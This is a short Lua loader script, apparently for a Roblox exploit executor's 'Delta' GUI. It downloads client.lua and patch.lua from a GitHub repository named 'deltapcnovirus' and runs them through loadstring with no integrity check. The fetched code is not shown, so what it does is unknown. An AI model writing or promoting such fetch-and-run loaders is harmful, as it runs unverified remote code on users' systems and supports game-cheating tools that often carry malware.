-- Delta captured GUI (local joke key)
-- This frontend runs through your existing executor.
local function retrieve(path)
    local source = game:HttpGet("https://raw.githubusercontent.com/a65407112-boop/deltapcnovirus/main/" .. path)
    local chunk, errorMessage = loadstring(source)
    assert(chunk, errorMessage)
    return chunk()
end
local start = retrieve("client.lua")
local ui = start(true)
local apply = retrieve("patch.lua")
return apply(ui, true)
